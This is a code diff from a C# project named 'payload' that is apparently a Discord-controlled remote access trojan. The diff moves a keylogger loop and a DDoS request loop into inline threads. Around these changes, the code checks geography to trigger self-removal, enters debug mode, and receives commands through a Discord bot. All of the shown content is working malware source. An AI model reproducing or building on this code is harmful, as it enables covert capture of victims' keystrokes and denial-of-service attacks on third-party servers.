@@ -64,8 +64,35 @@ namespace payload
             if (Geocheck()) Uninfect();
             SetProcessDPIAware();
             try { Process.EnterDebugMode(); } catch { }
-            new Thread(new ThreadStart(KeylogThread)).Start();
-            new Thread(new ThreadStart(DdosThread)).Start();
+
+            new Thread(() =>
+            {
+                while (true)
+                {
+                    if (logkeys)
+                    {
+                        for (int i = 0; i < 255; i++)
+                        {
+                            int key = GetAsyncKeyState(i);
+                            if (key == 1 || key == -32767)
+                            {
+                                keylog += (Keys)i + " ";
+                            }
+                        }
+                    }
+                    Thread.Sleep(1);
+                }
+            }).Start();
+
+            new Thread(() =>
+            {
+                HttpClient hc = new HttpClient();
+                while (true)
+                {
+                    if (ddos) hc.GetAsync(toddos).GetAwaiter().GetResult();
+                    Thread.Sleep(1000);
+                }
+            }).Start();
 
             client = new DiscordSocketClient();
             client.MessageReceived += MessageReceived;
@@ -282,35 +309,6 @@ namespace payload
                         Uninfect();
                         break;
                     }
-            }
-        }
-
-        private static void DdosThread()
-        {
-            HttpClient hc = new HttpClient();
-            while (true)
-            {
-                if (ddos) hc.GetAsync(toddos).GetAwaiter().GetResult();
-                Thread.Sleep(1000);
-            }
-        }
-
-        private static void KeylogThread()
-        {
-            while (true)
-            {
-                if (logkeys)
-                {
-                    for (int i = 0; i < 255; i++)
-                    {
-                        int key = GetAsyncKeyState(i);
-                        if (key == 1 || key == -32767)
-                        {
-                            keylog += (Keys)i + " ";
-                        }
-                    }
-                }
-                Thread.Sleep(1);
             }
         }
 
